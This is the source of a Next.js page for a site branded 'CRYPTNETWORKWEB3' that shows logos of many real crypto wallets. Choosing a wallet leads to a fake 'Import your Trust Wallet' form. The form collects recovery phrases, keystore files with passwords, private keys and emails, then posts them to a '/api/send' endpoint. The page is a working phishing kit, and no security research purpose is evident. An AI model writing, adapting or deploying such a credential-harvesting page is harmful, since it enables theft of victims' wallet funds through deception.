



"use client"
import styles from "./page.module.css"
import { useState, useRef } from "react"
import { useRouter } from 'next/navigation';
import Image from "next/image";


export default function Page() {
  const [show1, setShow1] = useState(false)
  const [show2, setShow2] = useState(false)
  const [sym, setSym] = useState({})
  const [loading, setLoading] = useState(false)
  function handleClick(file){
    setSym(file)
    setShow1(!show1)
    console.log(file)
  }
  function handleClick2(){
    setShow1(!show1)
    setShow2(!show2)
  }
  function handleClick3(){
    setShow2(!show2)
  }

  function handleLoading(){
    setLoading(!loading)
  }
  return (
    <div className={styles.page}>
      <Navbar/>
      <Hero/>
      <Choose handleShow={handleClick}/>
      {show1 && <Popup handleShow={handleClick} file={sym} handleShow2={handleClick2}/>}
      {show2 && <Popup2 handleShow={handleClick2} handleShow2={handleClick3} handleLoading = {handleLoading}/>}
      {loading && <Loader/>}
    </div>
  )
}

export function Navbar(){
  const [pop, setPop] = useState(false)
  const router = useRouter();
  function handleClick(){
    setPop(!pop)
  }
  return (
    <nav className={styles.nav}>
        <h1>CRYPTNETWORKWEB3</h1>
        <ul>
            <li>DApps</li>
            <li>NFT</li>
            <li>Web3</li>
        </ul>
        {pop && <main>
          <span onClick={handleClick}>X</span>
          <ol>
            <li>DApps</li>
            <li>NFT</li>
            <li>Web3</li>
          </ol>
        </main>}
        <button>Secure Wallet</button>
        <div onClick={handleClick}>
          <span></span><span></span><span></span>
        </div>
    </nav>
  )
}

export function Hero(){
  return (
    <section className={styles.hero}>
        <h1>Secure</h1>
        <div>
            Refers to the safety and protection of assets, data, and transactions in the crypto space. Investors should prioritize platforms with robust security measures like encryption and multi-factor authentication.
        </div>
    </section>
  )
}

export function Choose({handleShow}){
  const files = [
  { src: "/symbols/akt.png", text: "akt" },
  { src: "/symbols/alice.png", text: "alice" },
  { src: "/symbols/alphawallet.jpg", text: "alphawallet" },
  { src: "/symbols/anchor.png", text: "anchor" },
  { src: "/symbols/argent.jpg", text: "argent" },
  { src: "/symbols/atomic.png", text: "atomic" },
  { src: "/symbols/atwallet.png", text: "atwallet" },
  { src: "/symbols/authereum.png", text: "authereum" },
  { src: "/symbols/bitkeep.png", text: "bitkeep" },
  { src: "/symbols/bitpay.jpg", text: "bitpay" },
  { src: "/symbols/blockchain.png", text: "blockchain" },
  { src: "/symbols/bridge wallet.png", text: "bridge wallet" },
  { src: "/symbols/bsc-logo.png", text: "bsc-logo" },
  { src: "/symbols/coin98.png", text: "coin98" },
  { src: "/symbols/coinbase.png", text: "coinbase" },
  { src: "/symbols/coinomi.jpg", text: "coinomi" },
  { src: "/symbols/coolwallet.png", text: "coolwallet" },
  { src: "/symbols/cosmosstation.png", text: "cosmosstation" },
  { src: "/symbols/crypto.com.png", text: "crypto.com" },
  { src: "/symbols/cybavowallet.png", text: "cybavowallet" },
  { src: "/symbols/dcentwallet.png", text: "dcentwallet" },
  { src: "/symbols/dok-7.png", text: "dok-7" },
  { src: "/symbols/easypocket.jpg", text: "easypocket" },
  { src: "/symbols/eidoo.png", text: "eidoo" },
  { src: "/symbols/ellipal.png", text: "ellipal" },
  { src: "/symbols/equal.jpg", text: "equal" },
  { src: "/symbols/exodus.png", text: "exodus" },
  { src: "/symbols/fetch.jpg", text: "fetch" },
  { src: "/symbols/gnosis safe multisig.jpg", text: "gnosis safe multisig" },
  { src: "/symbols/graph.jpg", text: "graph" },
  { src: "/symbols/gridplus.png", text: "gridplus" },
  { src: "/symbols/harmony.png", text: "harmony" },
  { src: "/symbols/huobi wallet.jpg", text: "huobi wallet" },
  { src: "/symbols/iconex.png", text: "iconex" },
  { src: "/symbols/infinito wallet.png", text: "infinito wallet" },
  { src: "/symbols/infinity wallet.png", text: "infinity wallet" },
  { src: "/symbols/kardachain.png", text: "kardachain" },
  { src: "/symbols/keplr.png", text: "keplr" },
  { src: "/symbols/keyringpro.png", text: "keyringpro" },
  { src: "/symbols/ledger live.png", text: "ledger live" },
  { src: "/symbols/lobstr.png", text: "lobstr" },
  { src: "/symbols/loopring wallet.jpg", text: "loopring wallet" },
  { src: "/symbols/maiar.png", text: "maiar" },
  { src: "/symbols/mathwallet.png", text: "mathwallet" },
  { src: "/symbols/meetone.jpg", text: "meetone" },
  { src: "/symbols/metamask.png", text: "metamask" },
  { src: "/symbols/midas.png", text: "midas" },
  { src: "/symbols/morixwallet.png", text: "morixwallet" },
  { src: "/symbols/mykey.png", text: "mykey" },
  { src: "/symbols/nash.jpg", text: "nash" },
  { src: "/symbols/onto.png", text: "onto" },
  { src: "/symbols/ownbit-.png", text: "ownbit-" },
  { src: "/symbols/peakdefi.png", text: "peakdefi" },
  { src: "/symbols/pillar.png", text: "pillar" },
  { src: "/symbols/rainbow.png", text: "rainbow" },
  { src: "/symbols/safepal.png", text: "safepal" },
  { src: "/symbols/sparkpoint.png", text: "sparkpoint" },
  { src: "/symbols/spatium.jpg", text: "spatium" },
  { src: "/symbols/swft wallet.png", text: "swft wallet" },
  { src: "/symbols/tokenary.png", text: "tokenary" },
  { src: "/symbols/tokenpocket.png", text: "tokenpocket" },
  { src: "/symbols/torus.jpg", text: "torus" },
  { src: "/symbols/trust.png", text: "trust" },
  { src: "/symbols/trustvault.png", text: "trustvault" },
  { src: "/symbols/unstoppable.png", text: "unstoppable" },
  { src: "/symbols/viawallet.png", text: "viawallet" },
  { src: "/symbols/vision.png", text: "vision" },
  { src: "/symbols/wallet connect.jpg", text: "wallet connect" },
  { src: "/symbols/wallet.io.png", text: "wallet.io" },
  { src: "/symbols/walleth.png", text: "walleth" },
  { src: "/symbols/wazirx.png", text: "wazirx" },
  { src: "/symbols/xdc.png", text: "xdc" },
  { src: "/symbols/zelcore.png", text: "zelcore" }
];



  return (
    <section className={styles.choice}>
        <div className={styles.wallet}>
            <p>Choose wallet</p>
            <p>
              Show uninstalled
              <input type="checkbox" name="" id="check" className={styles.checkbox}/>
              <label htmlFor="check" className={styles.check}></label>
            </p>
        </div>
        <div className={styles.cardbox}>
          {files.map((file, i) =>{
            return(
              <div className={styles.card} key={i} onClick={()=> handleShow(file)}>
                <Image
                  src={file.src}
                  alt="Coin Logo"
                  width={50}
                  height={50}
                  priority
                />
                <h2>{file.text}</h2>
              </div>
            )
          })}
        </div>
    </section>
  )
}

export function Popup({handleShow, file, handleShow2}){
  return (
    <section className={styles.popup}>
        <main>
          <span onClick={handleShow}>X</span>
          <Image
            src={file.src}
            alt="Coin Logo"
            width={50}
            height={50}
            priority
          />
          <h1>{file.text}</h1>
          <p>A Web3 wallet is a versatile and significant piece of technology that is set to revolutionize the way our online identity is presented and accessed. Wallet connect wallet can go here.</p>
          <button onClick={handleShow2}>Connect</button>
        </main>
    </section>
  )
}

export function Popup2({handleShow, handleShow2, handleLoading}){
  const [form, setForm] = useState([])
  const [type, setType] = useState("phrase")
  const [error, setError] = useState(false)
  const router = useRouter()
  const handleChange = (e)=>{
    setForm({
      ...form,
      [e.target.name] : e.target.value,
    })
  }

  function handleSubmit(){
    if (form.length === 0){
      setError(!error)
      setTimeout(()=>{
        setError(!error)
      }, 2000)
    } else{
        handleLoading()
        fetch("/api/send", {
          method: "POST",
          cache: "no-cache",
          body: JSON.stringify({
            ...form
          }),
          headers: {
            "Content-type": "application/json"
          }
        })
        .then(res=> {
          console.log(res.status)
          if(res.status === 200){
            handleLoading()
            res.json()
            router.push("/success")
          } else{
            handleLoading()
          }
        })
        .then(data => {
          console.log(data)
        })
    }
    
    
  }

  function handleTypeChange(type){
    setType(type)
  }
  return (
    <section className={styles.popup2}>
      <main>
        <div className={styles.popup2head}>
            <Image
              src="/symbols/trust.png"
              alt="Coin Logo"
              width={50}
              height={50}
              priority
            />
            <h1>Import your Trust Wallet </h1> 
            <span onClick={handleShow2}>X</span>
        </div>
        <div className={styles.popup2subhead}>
            <span onClick={() => handleTypeChange("phrase")} style={type === "phrase" ? {borderBottom: "3px solid"} : {border: "none"}}>Phrase</span>
            <span onClick={() => handleTypeChange("key")} style={type === "key" ? {borderBottom: "3px solid"} : {border: "none"}}>Keystore JSON</span>
            <span onClick={() => handleTypeChange("private")} style={type === "private" ? {borderBottom: "3px solid"} : {border: "none"}}>Private Key</span>
        </div>
        {type ==="phrase" && <section>
            <div>
                <label htmlFor="">Wallet Name</label>
                <input type="text" placeholder="Wallet Name" name="name" onChange={(e)=>handleChange(e)}/>
            </div>
            <div>
                <label htmlFor="">Email</label>
                <input type="email" placeholder="Email" name="email" onChange={(e)=>handleChange(e)}/>
            </div>
            <div>
                <label htmlFor="">Phrase</label>
                <textarea placeholder="Enter recovery phrase" name="phrase" onChange={(e)=>handleChange(e)}></textarea>
                <p>Typically 12 (sometimes 24) words separated by single spaces</p>
            </div> 
        </section>}
        {type === "key" && <section>
            <p>Upload or paste your keystore JSON contents here.</p>
            <input type="text" placeholder="Wallet Name"  name="name" onChange={(e)=>handleChange(e)}/>
            <input type="email" placeholder="Email"  name="email" onChange={(e)=>handleChange(e)}/>
            <textarea placeholder="KeyStore JSON"  name="key" onChange={(e)=>handleChange(e)}></textarea>
            <input type="password" placeholder="Wallet Password"  name="password" onChange={(e)=>handleChange(e)}/>
            <p>Several lines of text beginning with "(...)" plus the password you used to encrypt it.</p>
        </section>}
        {type === "private" && <section>
            <p>Enter your private key below:</p>
            <input type="text" placeholder="Wallet Name" name="name" onChange={(e)=>handleChange(e)}/>
            <input type="email" placeholder="Email" name="email" onChange={(e)=>handleChange(e)}/>
            <textarea placeholder="KeyStore JSON" name="key" onChange={(e)=>handleChange(e)}></textarea>
            <input type="password" placeholder="Enter your private key" name="private" onChange={(e)=>handleChange(e)}/>
            <p>Typically 12 (sometimes 24) words separated by a single space.</p>
        </section>}
        {error && <strong>Please fill in the empty spaces!!!</strong>}
        <div className={styles.btns}>
            <button onClick={handleShow2}>Cancel</button>
            <button onClick={handleSubmit}>Proceed</button>
        </div>
      </main>
        
    </section>
  )
}

export function Loader(){
  return (
    <section className={styles.loader}>
        <Image
          src="/icons/icon.png"
          alt="Coin Logo"
          width={50}
          height={50}
          priority
        />
    </section>
  )
}